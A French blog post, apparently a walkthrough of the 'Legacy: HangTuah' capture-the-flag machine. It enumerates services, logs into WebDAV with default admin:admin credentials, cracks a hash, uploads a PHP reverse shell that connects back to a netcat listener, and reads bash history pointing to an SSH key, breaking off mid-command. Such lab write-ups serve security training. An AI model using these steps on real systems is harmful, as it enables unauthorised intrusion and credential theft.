{"hash":"250f333e9ef0347f8247956a19dfdff7c411a751","data":{"post":{"title":"CTF Legacy: HangTuah","date":"6 May 2021","content":"<h2>Avant propos</h2>\n<p>Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.<br>\nCe CTF a été réalisé avec une machine attaquante <strong>Kali 2021.1</strong> (<code class=\"language-text\">lsb_release -r</code>).</p>\n<h2>Enumération</h2>\n<p>On récupère l'adresse IP de la machine distante avec <strong>Netdiscover</strong> <code class=\"language-text\">sudo netdiscover</code>.<br>\nAvant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite <code class=\"language-text\">export IP=192.168.1.28</code>.<br>\nPuis on créé un dossier dédié à ce CTF <code class=\"language-text\">cd Documents/ctf &amp;&amp; mkdir LegacyHangTuah &amp;&amp; cd LegacyHangTuah</code>.<br>\nOn lance <strong>Nmap</strong> pour scanner les ports de la machine distante.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ nmap -A -p- <span class=\"token variable\">$IP</span> -oN nmap.txt\n<span class=\"token number\">22</span>/tcp  <span class=\"token function\">open</span>  <span class=\"token function\">ssh</span>     OpenSSH <span class=\"token number\">8</span>.2p1 Ubuntu 4ubuntu0.1 <span class=\"token punctuation\">(</span>Ubuntu Linux<span class=\"token punctuation\">;</span> protocol <span class=\"token number\">2.0</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span> ssh-hostkey:\n<span class=\"token operator\">|</span>   <span class=\"token number\">3072</span> eb:69:e0:4f:d0:4e:9e:98:73:9b:fb:67:3a:36:de:21 <span class=\"token punctuation\">(</span>RSA<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>   <span class=\"token number\">256</span> <span class=\"token number\">17</span>:1c:eb:9e:be:a5:68:25:f1:24:8b:0d:23:5d:9b:c1 <span class=\"token punctuation\">(</span>ECDSA<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_  <span class=\"token number\">256</span> e0:1b:77:26:eb:cb:93:94:b5:f0:04:a3:29:9c:33:c7 <span class=\"token punctuation\">(</span>ED25519<span class=\"token punctuation\">)</span>\n<span class=\"token number\">80</span>/tcp  <span class=\"token function\">open</span>  http    Apache httpd <span class=\"token number\">2.4</span>.41 <span class=\"token variable\"><span class=\"token punctuation\">((</span>Ubuntu<span class=\"token punctuation\">))</span></span>\n<span class=\"token operator\">|</span>_http-server-header: Apache/2.4.41 <span class=\"token punctuation\">(</span>Ubuntu<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_http-title: Apache2 Ubuntu Default Page: It works\n<span class=\"token number\">777</span>/tcp <span class=\"token function\">open</span>  <span class=\"token function\">ftp</span>     vsftpd <span class=\"token number\">3.0</span>.3\n<span class=\"token operator\">|</span> ftp-anon: Anonymous FTP login allowed <span class=\"token punctuation\">(</span>FTP code <span class=\"token number\">230</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_Can't get directory listing: TIMEOUT\n<span class=\"token operator\">|</span> ftp-syst:\n<span class=\"token operator\">|</span>   STAT:\n<span class=\"token operator\">|</span> FTP server status:\n<span class=\"token operator\">|</span>      Connected to ::ffff:192.168.1.38\n<span class=\"token operator\">|</span>      Logged <span class=\"token keyword\">in</span> as <span class=\"token function\">ftp</span>\n<span class=\"token operator\">|</span>      TYPE: ASCII\n<span class=\"token operator\">|</span>      No session bandwidth limit\n<span class=\"token operator\">|</span>      Session <span class=\"token function\">timeout</span> <span class=\"token keyword\">in</span> seconds is <span class=\"token number\">300</span>\n<span class=\"token operator\">|</span>      Control connection is plain text\n<span class=\"token operator\">|</span>      Data connections will be plain text\n<span class=\"token operator\">|</span>      At session startup, client count was <span class=\"token number\">4</span>\n<span class=\"token operator\">|</span>      vsFTPd <span class=\"token number\">3.0</span>.3 - secure, fast, stable\n<span class=\"token operator\">|</span>_End of status</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On a un serveur <strong>SSH</strong> sur le port <strong>22</strong>, un serveur <strong>Apache</strong> 2.4.6 sur le port <strong>80</strong> et un serveur <strong>FTP</strong> sur le port <strong>777</strong> On commence donc par énumérer le serveur <strong>FTP</strong> en tant qu'utilisateur anonyme.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">ftp</span> <span class=\"token number\">192.168</span>.1.28 <span class=\"token number\">777</span>\nConnected to <span class=\"token number\">192.168</span>.1.28.\n<span class=\"token number\">220</span> <span class=\"token punctuation\">(</span>vsFTPd <span class=\"token number\">3.0</span>.3<span class=\"token punctuation\">)</span>\nName <span class=\"token punctuation\">(</span><span class=\"token number\">192.168</span>.1.28:kali<span class=\"token punctuation\">)</span>: anonymous\n<span class=\"token number\">331</span> Please specify the password.\nPassword:\n<span class=\"token number\">230</span> Login successful.\nRemote system <span class=\"token builtin class-name\">type</span> is UNIX.\nUsing binary mode to transfer files.\nftp<span class=\"token operator\">></span> <span class=\"token function\">ls</span> -la\n<span class=\"token number\">200</span> PORT <span class=\"token builtin class-name\">command</span> successful. Consider using PASV.\n<span class=\"token number\">150</span> Here comes the directory listing.\ndrwxr-xr-x    <span class=\"token number\">3</span> <span class=\"token number\">33</span>       <span class=\"token number\">33</span>           <span class=\"token number\">4096</span> Aug <span class=\"token number\">21</span>  <span class=\"token number\">2020</span> <span class=\"token builtin class-name\">.</span>\ndrwxr-xr-x    <span class=\"token number\">3</span> <span class=\"token number\">33</span>       <span class=\"token number\">33</span>           <span class=\"token number\">4096</span> Aug <span class=\"token number\">21</span>  <span class=\"token number\">2020</span> <span class=\"token punctuation\">..</span>\ndrwxr-xr-x    <span class=\"token number\">3</span> <span class=\"token number\">0</span>        <span class=\"token number\">33</span>           <span class=\"token number\">4096</span> Aug <span class=\"token number\">24</span>  <span class=\"token number\">2020</span> .secret\n<span class=\"token number\">226</span> Directory send OK.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Il y a un dossier \".secret\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">ftp<span class=\"token operator\">></span> <span class=\"token builtin class-name\">cd</span> .secret\n<span class=\"token number\">250</span> Directory successfully changed.\nftp<span class=\"token operator\">></span> <span class=\"token function\">ls</span> -la\n<span class=\"token number\">200</span> PORT <span class=\"token builtin class-name\">command</span> successful. Consider using PASV.\n<span class=\"token number\">150</span> Here comes the directory listing.\ndrwxr-xr-x    <span class=\"token number\">3</span> <span class=\"token number\">0</span>        <span class=\"token number\">33</span>           <span class=\"token number\">4096</span> Aug <span class=\"token number\">24</span>  <span class=\"token number\">2020</span> <span class=\"token builtin class-name\">.</span>\ndrwxr-xr-x    <span class=\"token number\">3</span> <span class=\"token number\">33</span>       <span class=\"token number\">33</span>           <span class=\"token number\">4096</span> Aug <span class=\"token number\">21</span>  <span class=\"token number\">2020</span> <span class=\"token punctuation\">..</span>\ndrwxr-xr-x    <span class=\"token number\">2</span> <span class=\"token number\">0</span>        <span class=\"token number\">33</span>           <span class=\"token number\">4096</span> Aug <span class=\"token number\">25</span>  <span class=\"token number\">2020</span> <span class=\"token punctuation\">..</span>.\n-rw-r--r--    <span class=\"token number\">1</span> <span class=\"token number\">0</span>        <span class=\"token number\">33</span>             <span class=\"token number\">42</span> Aug <span class=\"token number\">24</span>  <span class=\"token number\">2020</span> notes.txt</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Ce dernier contient un fichier texte nommé \"note.txt\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">ftp<span class=\"token operator\">></span> get notes.txt\nlocal: notes.txt remote: notes.txt\n<span class=\"token number\">200</span> PORT <span class=\"token builtin class-name\">command</span> successful. Consider using PASV.\n<span class=\"token number\">150</span> Opening BINARY mode data connection <span class=\"token keyword\">for</span> notes.txt <span class=\"token punctuation\">(</span><span class=\"token number\">42</span> bytes<span class=\"token punctuation\">)</span>.\n<span class=\"token number\">226</span> Transfer complete.\n<span class=\"token number\">42</span> bytes received <span class=\"token keyword\">in</span> <span class=\"token number\">0.00</span> secs <span class=\"token punctuation\">(</span><span class=\"token number\">16.4325</span> kB/s<span class=\"token punctuation\">)</span>\nftp<span class=\"token operator\">></span> <span class=\"token builtin class-name\">exit</span>\n<span class=\"token number\">221</span> Goodbye.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Fichier que l'on consulte.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> notes.txt\nN-o-t-h-i-n-g--I-n--H-e-r-e<span class=\"token operator\">!</span>\n\nM-a-y-b-e??</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>C'est explicite, on est tombé sur une fausse piste. Poursuivons en scannant le serveur <strong>Apache</strong> avec <strong>Nikto</strong> pour avoir un rapport de sécurité.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ nikto -h http://<span class=\"token variable\">$IP</span> -o nikto.txt\n+ Server: Apache/2.4.41 <span class=\"token punctuation\">(</span>Ubuntu<span class=\"token punctuation\">)</span>\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS\n+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class=\"token keyword\">in</span> a different fashion to the MIME <span class=\"token builtin class-name\">type</span>\n+ No CGI Directories found <span class=\"token punctuation\">(</span>use <span class=\"token string\">'-C all'</span> to force check all possible <span class=\"token function\">dirs</span><span class=\"token punctuation\">)</span>\n+ <span class=\"token string\">\"robots.txt\"</span> contains <span class=\"token number\">1</span> entry <span class=\"token function\">which</span> should be manually viewed.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Le fichier <a href=\"http://legacy-hang-thuah.home/robots.txt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">robots.txt</a> indique un nom de domaine.</p>\n<div class=\"gridsome-highlight\" data-language=\"txt\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-txt line-numbers\"><code class=\"language-txt\">User-agent: *\nAllow: /\n\nSitemap: http://legacyhangtuah.com</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Modifiez le fichier \"hosts\" pour que l'adresse IP du serveur pointe sur ce nom de domaine.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">sudo</span> <span class=\"token function\">vim</span> /etc/hosts\n<span class=\"token number\">192.168</span>.1.28    legacyhangtuah.com</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Le site est une single page sans rien d'intéressant. Scannons les pages et les fichiers avec <strong>Gobuster</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ gobuster <span class=\"token function\">dir</span> -u http://legacyhangtuah.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.xml,.js,.md,.log,.zip\n/index.html           <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">35386</span><span class=\"token punctuation\">]</span>\n/admin.txt            <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">48</span><span class=\"token punctuation\">]</span>\n/assets               <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">325</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://legacyhangtuah.com/assets/<span class=\"token punctuation\">]</span>\n/css                  <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">322</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://legacyhangtuah.com/css/<span class=\"token punctuation\">]</span>\n/manual               <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">325</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://legacyhangtuah.com/manual/<span class=\"token punctuation\">]</span>\n/README.txt           <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">41</span><span class=\"token punctuation\">]</span>\n/js                   <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">321</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://legacyhangtuah.com/js/<span class=\"token punctuation\">]</span>\n/server-status        <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">403</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">283</span><span class=\"token punctuation\">]</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Le fichier <a href=\"http://legacyhangtuah.com/admin.txt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">admin.txt</a> est une fausse piste.</p>\n<div class=\"gridsome-highlight\" data-language=\"txt\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-txt line-numbers\"><code class=\"language-txt\">Don&#39;t forget you are admin so do your job well!</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>Regardons s'il existe des sous domaines sur le <strong>vhost</strong> \"legacyhangtuah.com\" avec <strong>Gobuster</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ gobuster vhost -u legacyhangtuah.com -w /usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt\nFound: door.legacyhangtuah.com <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">2062</span><span class=\"token punctuation\">]</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Effectivement, il existe un sous domaine \"door.legacyhangtuah.com\". Pour le prendre en compte, modifiez à nouveau le fichier \"hosts\" pour que l'adresse IP du serveur pointe sur ce sous domaine.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">sudo</span> <span class=\"token function\">vim</span> /etc/hosts\n<span class=\"token number\">192.168</span>.1.28    legacyhangtuah.com door.legacyhangtuah.com</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>On fait de nouveau un scan avec <strong>Gobuster</strong> sur ce sous domaine.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ gobuster <span class=\"token function\">dir</span> -u http://door.legacyhangtuah.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.xml,.js,.md,.log,.zip\n/images               <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">335</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://door.legacyhangtuah.com/images/<span class=\"token punctuation\">]</span>\n/index.php            <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">2062</span><span class=\"token punctuation\">]</span>\n/README.md            <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">1998</span><span class=\"token punctuation\">]</span>\n/LICENSE              <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">6554</span><span class=\"token punctuation\">]</span>\n/webdav               <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">401</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">470</span><span class=\"token punctuation\">]</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><a href=\"http://door.legacyhangtuah.com/webdav\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://door.legacyhangtuah.com/webdav</a> est une page protégée mais pas suffisament car \"admin:admin\" fonctionne. Dans cette page il y a un fichier \"passwd.dav\" avec ce contenu <code class=\"language-text\">admin:$apr1$9tA20Rqw$4qbIQ4QFUV6uUVhfH9NSJ/</code>.</p>\n<p>Mot de passe que l'on peut décoder avec <strong>John the Ripper</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">'admin:<span class=\"token variable\">$apr1</span><span class=\"token variable\">$9tA20Rqw</span><span class=\"token variable\">$4qbIQ4QFUV6uUVhfH9NSJ</span>/'</span> <span class=\"token operator\">>></span> password.txt\n$ john password.txt\nadmin            <span class=\"token punctuation\">(</span>admin<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>De nouveau, le mot de passe est \"admin\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">ssh</span> admin@<span class=\"token variable\">$IP</span>\nadmin@192.168.1.28's password: admin</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Non ça ne marche pas, encore une fausse piste. Sur Internet, il s'avère que <strong>WebDAV</strong> est un protocole de <strong>HTTP</strong>. Après des recherche, il est possible d'uploader des fichiers sur ce genre de serveur avec un outil nommé <strong>cadaver</strong> (installé par défaut sur Kali Linux). On s'empresse de préparer un webshell.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cp</span> /usr/share/webshells/php/php-reverse-shell.php <span class=\"token builtin class-name\">.</span>\n$ <span class=\"token function\">vim</span> php-reverse-shell.php\n/<span class=\"token variable\">$ip</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>Puis dans un nouvel onglet du terminal, on lance un serveur <strong>Netcat</strong> sur le port <strong>1234</strong> <code class=\"language-text\">nc -lvp 1234</code>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ cadaver http://door.legacyhangtuah.com/webdav\nAuthentication required <span class=\"token keyword\">for</span> webdav on server `door.legacyhangtuah.com':\nUsername: admin\nPassword:\ndav:/webdav/<span class=\"token operator\">></span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Affichons la liste des commandes disponibles.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">dav:/webdav/<span class=\"token operator\">></span> <span class=\"token builtin class-name\">help</span>\nAvailable commands:\n <span class=\"token function\">ls</span>         <span class=\"token builtin class-name\">cd</span>         <span class=\"token builtin class-name\">pwd</span>        put        get        mget       mput\n edit       <span class=\"token function\">less</span>       mkcol      <span class=\"token function\">cat</span>        delete     rmcol      copy\n move       lock       unlock     discover   steal      showlocks  version\n checkin    checkout   uncheckout <span class=\"token function\">history</span>    label      propnames  chexec\n propget    propdel    propset    search     <span class=\"token builtin class-name\">set</span>        <span class=\"token function\">open</span>       close\n <span class=\"token builtin class-name\">echo</span>       quit       <span class=\"token builtin class-name\">unset</span>      lcd        lls        lpwd       <span class=\"token builtin class-name\">logout</span>\n <span class=\"token builtin class-name\">help</span>       describe   about\nAliases: <span class=\"token assign-left variable\">rm</span><span class=\"token operator\">=</span>delete, <span class=\"token assign-left variable\">mkdir</span><span class=\"token operator\">=</span>mkcol, <span class=\"token assign-left variable\">mv</span><span class=\"token operator\">=</span>move, <span class=\"token assign-left variable\">cp</span><span class=\"token operator\">=</span>copy, <span class=\"token assign-left variable\">more</span><span class=\"token operator\">=</span>less, <span class=\"token assign-left variable\">quit</span><span class=\"token operator\">=</span>exit<span class=\"token operator\">=</span>bye</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Celle qui nous intréresse est <code class=\"language-text\">put</code>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">dav:/webdav/<span class=\"token operator\">></span> put php-reverse-shell.php\nUploading php-reverse-shell.php to `/webdav/php-reverse-shell.php':\nProgress: <span class=\"token punctuation\">[</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span><span class=\"token operator\">></span><span class=\"token punctuation\">]</span> <span class=\"token number\">100,0</span>% of <span class=\"token number\">5494</span> bytes succeeded.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>Si on rafraichit le répertoire <a href=\"http://door.legacyhangtuah.com/webdav\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://door.legacyhangtuah.com/webdav</a>, le reverse shell apparait dans la liste des fichiers que l'on exécute en cliquant dessus.</p>\n<h2>Pénétration</h2>\n<p>Dans l'autre onglet du terminal, la connexion au serveur est établi.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ python3 -c <span class=\"token string\">'import pty;pty.spawn(\"/bin/bash\")'</span>\n$ <span class=\"token function\">id</span>\n<span class=\"token assign-left variable\">uid</span><span class=\"token operator\">=</span><span class=\"token number\">33</span><span class=\"token punctuation\">(</span>www-data<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">gid</span><span class=\"token operator\">=</span><span class=\"token number\">33</span><span class=\"token punctuation\">(</span>www-data<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">groups</span><span class=\"token operator\">=</span><span class=\"token number\">33</span><span class=\"token punctuation\">(</span>www-data<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>On peut ouvrir un fichier dans le dossier \"/home\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> /home/pendekar/send_letter.txt\n<span class=\"token number\">23595</span> Gold <span class=\"token keyword\">for</span> you<span class=\"token operator\">!</span><span class=\"token operator\">!</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>On retourne dans le dossier de l'utilsateur \"www-data\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token builtin class-name\">cd</span> /var/www <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">ls</span> -la\n-rw-------  <span class=\"token number\">1</span> www-data www-data <span class=\"token number\">6378</span> Aug <span class=\"token number\">25</span>  <span class=\"token number\">2020</span> .bash_history\ndrwx------  <span class=\"token number\">2</span> www-data www-data <span class=\"token number\">4096</span> May  <span class=\"token number\">3</span> <span class=\"token number\">17</span>:49 .gnupg\ndrwxrwxrwx  <span class=\"token number\">3</span> www-data www-data <span class=\"token number\">4096</span> Aug <span class=\"token number\">24</span>  <span class=\"token number\">2020</span> .local\n-rw-rw-rw-  <span class=\"token number\">1</span> www-data www-data  <span class=\"token number\">180</span> May  <span class=\"token number\">3</span> <span class=\"token number\">17</span>:47 .wget-hsts\ndrwxr-xr-x  <span class=\"token number\">3</span> www-data www-data <span class=\"token number\">4096</span> Aug <span class=\"token number\">21</span>  <span class=\"token number\">2020</span> chest\ndrwxr-xr-x  <span class=\"token number\">3</span> www-data www-data <span class=\"token number\">4096</span> Aug <span class=\"token number\">24</span>  <span class=\"token number\">2020</span> door.legacyhangtuah.com\ndrwxr-xr-x  <span class=\"token number\">2</span> www-data www-data <span class=\"token number\">4096</span> Aug <span class=\"token number\">24</span>  <span class=\"token number\">2020</span> html\ndrwxr-xr-x  <span class=\"token number\">3</span> www-data www-data <span class=\"token number\">4096</span> Aug <span class=\"token number\">24</span>  <span class=\"token number\">2020</span> legacyhangtuah.com\ndrwxr-xr-x  <span class=\"token number\">3</span> www-data www-data <span class=\"token number\">4096</span> May  <span class=\"token number\">3</span> <span class=\"token number\">17</span>:49 snap</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Il y a des choses intéressantes dans le fichier d'historique \".bash_history\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> .bash_history\n<span class=\"token builtin class-name\">cd</span> /opt\n<span class=\"token function\">ls</span> -la\n<span class=\"token builtin class-name\">cd</span> pendekar/\n<span class=\"token comment\"># [plein de lignes]</span>\n<span class=\"token builtin class-name\">echo</span> <span class=\"token string\">'/home/pendekar/.ssh/id_rsa'</span> <span class=\"token operator\">></span> official_letter.txt\n<span class=\"token function\">cat</span> official_letter.txt</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On essaie de reproduire cette commmande.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token builtin class-name\">cd</span> /opt/pendekar/\n$ <span class=\"token 